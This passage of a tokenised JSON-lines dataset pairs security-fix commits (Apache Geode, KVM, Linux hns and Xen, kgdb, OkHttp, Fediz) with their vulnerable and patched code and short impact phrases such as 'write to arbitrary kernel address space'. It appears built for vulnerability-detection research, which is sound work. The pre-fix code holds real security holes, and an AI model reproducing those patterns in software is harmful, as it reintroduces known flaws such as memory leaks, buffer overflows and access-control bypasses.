"url_to_the_issuer", "<", "/", "issuer", ">", "<", "roleDelimiter", ">", ";<", "/", "roleDelimiter", ">", "<", "roleURI", ">", "http", ":", "//", "schemas", ".", "xmlsoap", ".", "org", "/", "ws", "/", "2005", "/", "05", "/", "identity", "/", "claims", "/", "role", "<", "/", "roleURI", ">", "<", "authenticationType", "value", "=", "\"", "some", "auth", "type", "\"", "type", "=", "\"", "String", "\"", "/", ">", "<", "freshness", ">", "10000", "<", "/", "freshness", ">", "<", "reply", ">", "reply", "value", "<", "/", "reply", ">", "<", "request", ">", "REQUEST", "<", "/", "request", ">", "<", "claimTypesRequested", ">", "<", "claimType", "type", "=", "\"", "a", "particular", "claim", "type", "\"", "optional", "=", "\"", "true", "\"", "/", ">", "<", "/", "claimTypesRequested", ">", "<", "/", "protocol", ">", "<", "/", "contextConfig", ">", "<", "/", "FedizConfig", "></s>return", "new", "ArrayList", "<", "String", ">", "()", ";", "validateAudienceRestrictions", "(", "federationResponse", ".", "getAudience", "(", "),", "request", ".", "getRequestURL", "(", ").", "toString", "(", "))", ";", "/", "/", "validate", "against", "the", "configured", "list", "of", "audienceURIs"], "docstring_tokens": ["have", "bypass", "intended", "restrictions", "and", "have", "unspecified", "other", "impact"]}
{"contents": ["GEODE-3974:", "revert", "a", "change", "to", "log", "the", "exception", "in", "the", "server", "logs", "(#1444)"], "code_tokens": ["if", "(", "logger", ".", "isDebugEnabled", "(", "))", "{", "logger", ".", "debug", "(", "\"", "Exception", "occurred", "on", "remote", "member", "while", "executing", "Function", ":", "{", "}\"", ",", "this", ".", "functionObject", ".", "getId", "(", "),", "exception", ")", ";", "}</s>logger", ".", "error", "(", "\"", "Exception", "occurred", "on", "remote", "member", "while", "executing", "Function", ":", "{", "}\"", ",", "this", ".", "functionObject", ".", "getId", "(", "),", "exception", ")", ";"], "docstring_tokens": ["Code", "deployment", "should", "be", "restricted", "to", "users", "with", "DATA:MANAGE", "privilege"]}
{"contents": ["GEODE-5076", "jmx", "client", "should", "not", "access", "or", "modify", "internal", "regions", "Modified", "the", "management", "packages", "to", "use", "a", "filtered", "cache", "that", "doesn't", "allow", "users", "access", "to", "internal", "regions.", "This", "closes", "#2866"], "code_tokens": ["*", "getcachefor", "this", ".", "jmxAdvisor", "=", "JmxManagerAdvisor", ".", "createJmxManagerAdvisor", "(", "new", "JmxManagerAdvisee", "(", "getCacheForProcessingClientRequests", "(", "))", ");", "public", "InternalCacheForClientAccess", "getCacheForProcessingClientRequests", "(", ")", "{", "InternalCacheForClientAccess", "getCacheForProcessingClientRequests", "(", ");", "*", "This", "method", "can", "be", "used", "to", "locate", "an", "internal", "region", ".", "*", "It", "should", "not", "be", "invoked", "with", "a", "region", "name", "obtained", "*", "from", "a", "client", ".", "return", "delegate", ".", "getRegion", "(", "path", ")", ";", "/", "**", "*", "This", "method", "allows", "server", "-", "side", "code", "to", "create", "an", "internal", "region", ".", "It", "should", "*", "not", "be", "invoked", "with", "a", "region", "name", "obtained", "from", "a", "client", ".", "*", "/", "public", "<", "K", ",", "V", ">", "Region", "<", "K", ",", "V", ">", "createInternalRegion", "(", "String", "name", ",", "RegionAttributes", "<", "K", ",", "V", ">", "p_attrs", ",", "InternalRegionArguments", "internalRegionArgs", ")", "throws", "RegionExistsException", ",", "TimeoutException", ",", "IOException", ",", "ClassNotFoundException", "{", "return", "delegate", ".", "createVMRegion", "(", "name", ",", "p_attrs", ",", "internalRegionArgs", ")", ";", "}", "public", "InternalCacheForClientAccess", "getCacheForProcessingClientRequests", "(", ")", "{", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "public", "InternalCacheForClientAccess", "getCacheForProcessingClientRequests", "(", ")", "{", "return", "BaseManagementService", ".", "getManagementService", "(", "((", "InternalCache", ")", "cache", ")", ".", "getCacheForProcessingClientRequests", "(", "))", ";", "if", "(", "cache", "=", "=", "null", ")", "{", "return", "null", ";", "}", "return", "cache", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "public", "static", "ManagementService", "getManagementService", "(", "InternalCacheForClientAccess", "cache", ")", "{", "BaseManagementService", "service", "=", "instances", ".", "get", "(", "cache", ".", "getCacheForProcessingClientRequests", "(", "))", ";", "if", "(", "cache", ".", "getInternalRegion", "(", "monitoringRegionName", ")", "!", "=", "null", "&", "&", "cache", ".", "getInternalRegion", "(", "notificationRegionName", ")", "!", "=", "null", ")", "{", "cache", ".", "createInternalRegion", "(", "monitoringRegionName", ",", "monitoringRegionAttrs", ",", "cache", ".", "createInternalRegion", "(", "notificationRegionName", ",", "notifRegionAttrs", ",", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "private", "final", "InternalCacheForClientAccess", "cache", ";", "public", "JmxManagerAdvisee", "(", "InternalCacheForClientAccess", "cache", ")", "{", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "private", "InternalCacheForClientAccess", "cache", ";", "this", ".", "cache", "=", "internalCache", ".", "getCacheForProcessingClientRequests", "(", ");", "this", ".", "cache", "=", "(", "(", "InternalCache", ")", "cache", ")", ".", "getCacheForProcessingClientRequests", "(", ");", "InternalCache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "cache", ".", "createInternalRegion", "(", "ManagementConstants", ".", "MONITORING_REGION", "+", "\"", "_", "\"", "+", "appender", ",", "cache", ".", "createInternalRegion", "(", "ManagementConstants", ".", "NOTIFICATION_REGION", "+", "\"", "_", "\"", "+", "appender", ",", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "public", "static", "InternalCacheForClientAccess", "getCache", "(", ")", "{", "InternalCache", "cache", "=", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "if", "(", "cache", "!", "=", "null", ")", "{", "return", "cache", ".", "getCacheForProcessingClientRequests", "(", ");", "}", "return", "null", ";", "}", ".", "getManagementService", "(", "getCache", "(", "))", ";", "InternalCache", "cache", "=", "getCache", "(", ");", "InternalCache", "cache", "=", "(", "(", "InternalCache", ")", "fc", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "protected", "InternalCacheForClientAccess", "cache", ";", "this", ".", "cache", "=", "cache", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "private", "InternalCacheForClientAccess", "cache", ";", "public", "static", "BaseManagementService", "newSystemManagementService", "(", "InternalCacheForClientAccess", "cache", ")", "{", "protected", "SystemManagementService", "(", "InternalCacheForClientAccess", "cache", ")", "{", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "ManagementAgent", ";", "InternalCache", "cache", "=", "ManagementAgent", ".", "getCache", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "ManagementAgent", ";", "InternalCache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "InternalCache", "cache", "=", "ManagementAgent", ".", "getCache", "(", ");", "InternalCache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "InternalCache", "cache", "=", "(", "(", "InternalCache", ")", "functionContext", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "InternalCacheForClientAccess", "cacheForClientAccess", "=", "cache", ".", "getCacheForProcessingClientRequests", "(", ");", "Region", "exportLogsRegion", "=", "cacheForClientAccess", ".", "getInternalRegion", "(", "EXPORT_LOGS_REGION", ")", ";", "cacheForClientAccess", ".", "createInternalRegion", "(", "EXPORT_LOGS_REGION", ",", "regionAttrsFactory", ".", "create", "(", "),", "internalArgs", ")", ";", "Region", "exportLogsRegion", "=", "cache", ".", "getCacheForProcessingClientRequests", "(", ").", "getInternalRegion", "(", "EXPORT_LOGS_REGION", ")", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "final", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "Cache", "cache", "=", "(", "(", "InternalCache", ")", "context", ".", "getCache", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "import", "org", ".", "apache", ".", "logging", ".", "log4j", ".", "Logger", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "logging", ".", "LogService", ";", "private", "static", "final", "Logger", "logger", "=", "LogService", ".", "getLogger", "(", ");", "logger", ".", "warn", "(", "\"", "Error", "parsing", "command", "mode", "descriptor", "\"", ",", "e", ")", ";", "return", "(", ")", "-", ">", "(", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", "))", ".", "getCacheForProcessingClientRequests", "(", ");", "InternalCache", "cache", "=", "(", "InternalCache", ")", "context", ".", "getCache", "(", ");", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "when", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "final", "InternalCacheForClientAccess", "mockCacheFilter", "=", "mock", "(", "InternalCacheForClientAccess", ".", "class", ")", ";", "when", "(", "mockCache", ".", "getCacheForProcessingClientRequests", "(", "))", ".", "thenReturn", "(", "mockCacheFilter", ")", ";", "final", "InternalCacheForClientAccess", "mockCacheFilter", "=", "mock", "(", "InternalCacheForClientAccess", ".", "class", ")", ";", "when", "(", "mockCache", ".", "getCacheForProcessingClientRequests", "(", "))", ".", "thenReturn", "(", "mockCacheFilter", ")", ";", "final", "InternalCacheForClientAccess", "mockCacheFilter", "=", "mock", "(", "InternalCacheForClientAccess", ".", "class", ")", ";", "when", "(", "mockCache", ".", "getCacheForProcessingClientRequests", "(", "))", ".", "thenReturn", "(", "mockCacheFilter", ")", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCacheForClientAccess", ";", "private", "InternalCacheForClientAccess", "filterCache", ";", "filterCache", "=", "mock", "(", "InternalCacheForClientAccess", ".", "class", ")", ";", "when", "(", "cache", ".", "getCacheForProcessingClientRequests", "(", "))", ".", "thenReturn", "(", "filterCache", ")", ";", "when", "(", "filterCache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "null", ")", ";", "when", "(", "filterCache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "region", ")", ";", "when", "(", "filterCache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "region", ")", ";", ".", "withRegion", "(", "RegionShortcut", ".", "REPLICATE_PERSISTENT", ",", "\"", "persistentRegion", "\"", ")", ".", "withEmbeddedLocator", "(", ");", "@", "Test", "@", "ConnectionConfiguration", "(", "user", "=", "\"", "data", ",", "cluster", "\"", ",", "password", "=", "\"", "data", ",", "cluster", "\"", ")", "public", "void", "modifyInternalRegionSuperUser", "(", ")", "{", "CommandResult", "result", "=", "gfshConnection", ".", "executeCommand", "(", "\"", "put", "-", "-", "key", "=", "key1", "-", "-", "value", "=", "value1", "-", "-", "region", "=", "PdxTypes", "\"", ");", "assertThat", "(", "result", ".", "getStatus", "(", "))", ".", "isEqualTo", "(", "Result", ".", "Status", ".", "ERROR", ")", ";", "assertThat", "(", "result", ".", "getMessageFromContent", "(", "))", ".", "contains", "(", "\"", "Unauthorized", "\"", ");", "}", "regions", ".", "add", "(", "region", ")", ";", "}</s>this", ".", "jmxAdvisor", "=", "JmxManagerAdvisor", ".", "createJmxManagerAdvisor", "(", "new", "JmxManagerAdvisee", "(", "this", ")", ");", "public", "InternalCache", "getCacheForProcessingClientRequests", "(", ")", "{", "InternalCache", "getCacheForProcessingClientRequests", "(", ");", "*", "Server", "-", "side", "code", "using", "an", "InternalCacheForClientAccess", "may", "need", "to", "*", "get", "an", "Internal", "Region", "not", "normally", "accesible", "and", "may", "use", "this", "method", "to", "*", "do", "so", ".", "The", "REST", "API", ",", "for", "instance", ",", "needs", "to", "get", "at", "a", "Query", "store", "*", "region", "that", "is", "not", "otherwise", "accessible", "through", "the", "getRegion", "methods", ".", "Region", "<", "K", ",", "V", ">", "result", "=", "delegate", ".", "getRegion", "(", "path", ")", ";", "return", "result", ";", "public", "InternalCache", "getCacheForProcessingClientRequests", "(", ")", "{", "public", "InternalCache", "getCacheForProcessingClientRequests", "(", ")", "{", "return", "BaseManagementService", ".", "getManagementService", "(", "(", "InternalCache", ")", "cache", ")", ";", "return", "cache", ";", "public", "static", "ManagementService", "getManagementService", "(", "InternalCache", "cache", ")", "{", "BaseManagementService", "service", "=", "(", "BaseManagementService", ")", "instances", ".", "get", "(", "cache", ")", ";", "if", "(", "cache", ".", "getRegion", "(", "monitoringRegionName", ")", "!", "=", "null", "&", "&", "cache", ".", "getRegion", "(", "notificationRegionName", ")", "!", "=", "null", ")", "{", "cache", ".", "createVMRegion", "(", "monitoringRegionName", ",", "monitoringRegionAttrs", ",", "cache", ".", "createVMRegion", "(", "notificationRegionName", ",", "notifRegionAttrs", ",", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "InternalCache", ";", "private", "final", "InternalCache", "cache", ";", "public", "JmxManagerAdvisee", "(", "InternalCache", "cache", ")", "{", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "private", "InternalCache", "cache", ";", "this", ".", "cache", "=", "internalCache", ";", "this", ".", "cache", "=", "(", "InternalCache", ")", "cache", ";", "Cache", "cache", "=", "CacheFactory", ".", "getAnyInstance", "(", ");", "cache", ".", "createVMRegion", "(", "ManagementConstants", ".", "MONITORING_REGION", "+", "\"", "_", "\"", "+", "appender", ",", "cache", ".", "createVMRegion", "(", "ManagementConstants", ".", "NOTIFICATION_REGION", "+", "\"", "_", "\"", "+", "appender", ",", ".", "getManagementService", "(", "CacheFactory", ".", "getAnyInstance", "(", "))", ";", "InternalCache", "cache", "=", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "GemFireCacheImpl", ";", "InternalCache", "cache", "=", "GemFireCacheImpl", ".", "getInstance", "(", ");", "protected", "InternalCache", "cache", ";", "this", ".", "cache", "=", "cache", ";", "private", "InternalCache", "cache", ";", "public", "static", "BaseManagementService", "newSystemManagementService", "(", "InternalCache", "cache", ")", "{", "protected", "SystemManagementService", "(", "InternalCache", "cache", ")", "{", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "InternalCache", "cache", "=", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "InternalCache", "cache", "=", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "InternalCache", "cache", "=", "getCache", "(", ");", "InternalCache", "cache", "=", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "private", "InternalCache", "getCache", "(", ")", "{", "return", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "}", "InternalCache", "cache", "=", "getCache", "(", ");", "private", "InternalCache", "getCache", "(", ")", "{", "return", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "}", "InternalCache", "cache", "=", "(", "InternalCache", ")", "functionContext", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Region", "exportLogsRegion", "=", "cache", ".", "getRegion", "(", "EXPORT_LOGS_REGION", ")", ";", "cache", ".", "createVMRegion", "(", "EXPORT_LOGS_REGION", ",", "regionAttrsFactory", ".", "create", "(", "),", "internalArgs", ")", ";", "Region", "exportLogsRegion", "=", "cache", ".", "getRegion", "(", "EXPORT_LOGS_REGION", ")", ";", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "final", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "Cache", "cache", "=", "context", ".", "getCache", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "LogWriter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "Cache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "CacheFactory", ";", "Cache", "cache", "=", "CacheFactory", ".", "getAnyInstance", "(", ");", "LogWriter", "logger", "=", "cache", ".", "getLogger", "(", ");", "logger", ".", "warning", "(", "\"", "Error", "parsing", "command", "mode", "descriptor", "\"", ",", "e", ")", ";", "return", "(", ")", "-", ">", "(", "InternalCache", ")", "CacheFactory", ".", "getAnyInstance", "(", ");", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "cache", ".", "GemFireCacheImpl", ";", "InternalCache", "cache", "=", "GemFireCacheImpl", ".", "getInstance", "(", ");", "when", "(", "cache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "null", ")", ";", "when", "(", "cache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "region", ")", ";", "when", "(", "cache", ".", "getRegion", "(", "any", "(", "))", ").", "thenReturn", "(", "region", ")", ";", ".", "withRegion", "(", "RegionShortcut", ".", "REPLICATE_PERSISTENT", ",", "\"", "persistentRegion", "\"", ");", "if", "(", "region", "instanceof", "Region", ")", "{", "regions", ".", "add", "(", "region", ")", ";", "}", "}", ";"], "docstring_tokens": ["modify", "internal", "cluster", "metadata"]}
{"contents": ["KVM:", "x86:", "work", "around", "leak", "of", "uninitialized", "stack", "contents", "(", ")", "Bugzilla:", "1671930", "Emulation", "of", "certain", "instructions", "(VMXON,", "VMCLEAR,", "VMPTRLD,", "VMWRITE", "with", "memory", "operand,", "INVEPT,", "INVVPID)", "can", "incorrectly", "inject", "a", "page", "fault", "when", "passed", "an", "operand", "that", "points", "to", "an", "MMIO", "address.", "The", "page", "fault", "will", "use", "uninitialized", "kernel", "stack", "memory", "as", "the", "CR2", "and", "error", "code.", "The", "right", "behavior", "would", "be", "to", "abort", "the", "VM", "with", "a", "KVM_EXIT_INTERNAL_ERROR", "exit", "to", "userspace;", "however,", "it", "is", "not", "an", "easy", "fix,", "so", "for", "now", "just", "ensure", "that", "the", "error", "code", "and", "CR2", "are", "zero.", "Embargoed", "until", "Feb", "7th", "2019.", "Reported-by:", "Felix", "Wilhelm", "<fwilhelm@google.com>", "Cc:", "stable@kernel.org", "Signed-off-by:", "Paolo", "Bonzini", "<pbonzini@redhat.com>"], "code_tokens": ["/", "*", "*", "FIXME", ":", "this", "should", "call", "handle_emulation_failure", "if", "X86EMUL_IO_NEEDED", "*", "is", "returned", ",", "but", "our", "callers", "are", "not", "ready", "for", "that", "and", "they", "blindly", "*", "call", "kvm_inject_page_fault", ".", "Ensure", "that", "they", "at", "least", "do", "not", "leak", "*", "uninitialized", "kernel", "stack", "memory", "into", "cr2", "and", "error", "code", ".", "*", "/", "memset", "(", "exception", ",", "0", ",", "sizeof", "(", "*", "exception", ")", ");</s>"], "docstring_tokens": ["obtain", "host's", "stack", "memory", "contents", "and", "other", "sensitive", "information"]}
{"contents": ["net:", "hns:", "fix", "ethtool_get_strings", "overflow", "in", "hns", "driver", "hns_get_sset_count()", "returns", "HNS_NET_STATS_CNT", "and", "the", "data", "space", "allocated", "is", "not", "enough", "for", "ethtool_get_strings(),", "which", "will", "cause", "random", "memory", "corruption.", "When", "SLAB", "and", "DEBUG_SLAB", "are", "both", "enabled,", "memory", "corruptions", "like", "the", "the", "following", "can", "be", "observed", "without", "this", "patch:", "[", "43.115200]", "Slab", "corruption", "(Not", "tainted):", "Acpi-ParseExt", "start=ffff801fb0b69030,", "len=80", "[", "43.115206]", "Redzone:", "0x9f911029d006462/0x5f78745f31657070.", "[", "43.115208]", "Last", "user:", "[<5f7272655f746b70>](0x5f7272655f746b70)", "[", "43.115214]", "010:", "70", "70", "65", "31", "5f", "74", "78", "5f", "70", "6b", "74", "00", "6b", "6b", "6b", "6b", "ppe1_tx_pkt.kkkk", "[", "43.115217]", "030:", "70", "70", "65", "31", "5f", "74", "78", "5f", "70", "6b", "74", "5f", "6f", "6b", "00", "6b", "ppe1_tx_pkt_ok.k", "[", "43.115218]", "Next", "obj:", "start=ffff801fb0b69098,", "len=80", "[", "43.115220]", "Redzone:", "0x706d655f6f666966/0x9f911029d74e35b.", "[", "43.115229]", "Last", "user:", "[<ffff0000084b11b0>](acpi_os_release_object+0x28/0x38)", "[", "43.115231]", "000:", "74", "79", "00", "6b", "6b", "6b", "6b", "6b", "70", "70", "65", "31", "5f", "74", "78", "5f", "ty.kkkkkppe1_tx_", "[", "43.115232]", "010:", "70", "6b", "74", "5f", "65", "72", "72", "5f", "63", "73", "75", "6d", "5f", "66", "61", "69", "pkt_err_csum_fai", "Signed-off-by:", "Timmy", "Li", "<lixiaoping3@huawei.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["if", "(", "stringset", "=", "=", "ETH_SS_STATS", "|", "|", "stringset", "=", "=", "ETH_SS_PRIV_FLAGS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", "|", "|", "stringset", "=", "=", "ETH_SS_PRIV_FLAGS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", "|", "|", "stringset", "=", "=", "ETH_SS_PRIV_FLAGS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", "|", "|", "stringset", "=", "=", "ETH_SS_PRIV_FLAGS", ")</s>if", "(", "stringset", "=", "=", "ETH_SS_STATS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", ")", "if", "(", "stringset", "=", "=", "ETH_SS_STATS", ")"], "docstring_tokens": ["cause", "a", "denial", "of", "service", "(buffer", "overflow", "and", "memory", "corruption", ")", "or", "possibly", "have", "unspecified", "other", "impact"]}
{"contents": ["x86/mm/xen:", "Suppress", "hugetlbfs", "in", "PV", "guests", "Huge", "pages", "are", "not", "normally", "available", "to", "PV", "guests.", "Not", "suppressing", "hugetlbfs", "use", "results", "in", "an", "endless", "loop", "of", "page", "faults", "when", "user", "mode", "code", "tries", "to", "access", "a", "hugetlbfs", "mapped", "area", "(since", "the", "hypervisor", "denies", "such", "PTEs", "to", "be", "created,", "but", "error", "indications", "can't", "be", "propagated", "out", "of", "xen_set_pte_at(),", "just", "like", "for", "various", "of", "its", "siblings),", "and", "-", "once", "killed", "in", "an", "oops", "like", "this:", "kernel", "BUG", "at", ".../fs/hugetlbfs/inode.c:428!", "invalid", "opcode:", "0000", "[#1]", "SMP", "...", "RIP:", "e030:[<ffffffff811c333b>]", "[<ffffffff811c333b>]", "remove_inode_hugepages+0x25b/0x320", "...", "Call", "Trace:", "[<ffffffff811c3415>]", "hugetlbfs_evict_inode+0x15/0x40", "[<ffffffff81167b3d>]", "evict+0xbd/0x1b0", "[<ffffffff8116514a>]", "__dentry_kill+0x19a/0x1f0", "[<ffffffff81165b0e>]", "dput+0x1fe/0x220", "[<ffffffff81150535>]", "__fput+0x155/0x200", "[<ffffffff81079fc0>]", "task_work_run+0x60/0xa0", "[<ffffffff81063510>]", "do_exit+0x160/0x400", "[<ffffffff810637eb>]", "do_group_exit+0x3b/0xa0", "[<ffffffff8106e8bd>]", "get_signal+0x1ed/0x470", "[<ffffffff8100f854>]", "do_signal+0x14/0x110", "[<ffffffff810030e9>]", "prepare_exit_to_usermode+0xe9/0xf0", "[<ffffffff814178a5>]", "retint_user+0x8/0x13", "This", "is", "/", "XSA-174.", "Reported-by:", "Vitaly", "Kuznetsov", "<vkuznets@redhat.com>", "Signed-off-by:", "Jan", "Beulich", "<jbeulich@suse.com>", "Cc:", "Andrew", "Morton", "<akpm@linux-foundation.org>", "Cc:", "Andy", "Lutomirski", "<luto@amacapital.net>", "Cc:", "Boris", "Ostrovsky", "<boris.ostrovsky@oracle.com>", "Cc:", "Borislav", "Petkov", "<bp@alien8.de>", "Cc:", "Brian", "Gerst", "<brgerst@gmail.com>", "Cc:", "David", "Vrabel", "<david.vrabel@citrix.com>", "Cc:", "Denys", "Vlasenko", "<dvlasenk@redhat.com>", "Cc:", "H.", "Peter", "Anvin", "<hpa@zytor.com>", "Cc:", "Juergen", "Gross", "<JGross@suse.com>", "Cc:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>", "Cc:", "Luis", "R.", "Rodriguez", "<mcgrof@suse.com>", "Cc:", "Peter", "Zijlstra", "<peterz@infradead.org>", "Cc:", "Thomas", "Gleixner", "<tglx@linutronix.de>", "Cc:", "Toshi", "Kani", "<toshi.kani@hp.com>", "Cc:", "stable@vger.kernel.org", "Cc:", "xen-devel", "<xen-devel@lists.xenproject.org>", "Link:", "http://lkml.kernel.org/r/57188ED802000078000E431C@prv-mh.provo.novell.com", "Signed-off-by:", "Ingo", "Molnar", "<mingo@kernel.org>"], "code_tokens": ["#", "define", "hugepages_supported", "(", ")", "cpu_has_pse</s>"], "docstring_tokens": ["trigger", "an", "infinite", "page", "fault", "loop", "and", "cause", "the", "guest", "kernel", "to", "crash"]}
{"contents": ["kgdb:", "don't", "needlessly", "skip", "PAGE_USER", "test", "for", "Fsl", "booke", "The", "bypassing", "of", "this", "test", "is", "a", "leftover", "from", "2.4", "vintage", "kernels,", "and", "is", "no", "longer", "appropriate,", "or", "even", "used", "by", "KGDB.", "Currently", "KGDB", "uses", "probe_kernel_write()", "for", "all", "access", "to", "memory", "via", "the", "KGDB", "core,", "so", "it", "can", "simply", "be", "deleted.", "This", "fixes", ".", "CC:", "Benjamin", "Herrenschmidt", "<benh@kernel.crashing.org>", "CC:", "Paul", "Mackerras", "<paulus@samba.org>", "CC:", "Kumar", "Gala", "<galak@kernel.crashing.org>", "Signed-off-by:", "Wufei", "<fei.wu@windriver.com>", "Signed-off-by:", "Jason", "Wessel", "<jason.wessel@windriver.com>"], "code_tokens": ["</s>#", "ifndef", "CONFIG_KGDB", "/", "*", "want", "user", "access", "for", "breakpoints", "*", "/", "#", "else", "TLBCAM", "[", "index", "]", ".", "MAS3", "|", "=", "MAS3_UX", "|", "MAS3_UR", ";", "TLBCAM", "[", "index", "]", ".", "MAS3", "|", "=", "(", "(", "flags", "&", "_PAGE_RW", ")", "?", "MAS3_UW", ":", "0", ")", ";", "#", "endif"], "docstring_tokens": ["write", "to", "arbitrary", "kernel", "address", "space"]}
{"contents": ["Don't", "build", "a", "trust", "root", "index", "on", "Android.", "We", "can", "just", "cheat", "and", "use", "reflection", "to", "use", "Conscrypt's", "trust", "root", "index", "directly.", "This", "results", "in", "a", "substantial", "savings", "in", "app", "startup", "-", "500", "milliseconds", "or", "more.", "Closes:", "https://github.com/square/okhttp/issues/2321"], "code_tokens": ["import", "okhttp3", ".", "internal", ".", "tls", ".", "CertificateChainCleaner", ";", "import", "okhttp3", ".", "internal", ".", "tls", ".", "RealTrustRootIndex", ";", "public", "final", "class", "CertificateChainCleanerTest", "{", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "root", ")", ",", "council", ".", "clean", "(", "list", "(", "root", ")", "))", ";", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "))", ";", "council", ".", "clean", "(", "list", "(", "root", ")", ");", "CertificateChainCleaner", "council", "=", "new", "CertificateChainCleaner", "(", "new", "RealTrustRootIndex", "(", "root", ".", "certificate", ")", ");", "assertEquals", "(", "list", "(", "certB", 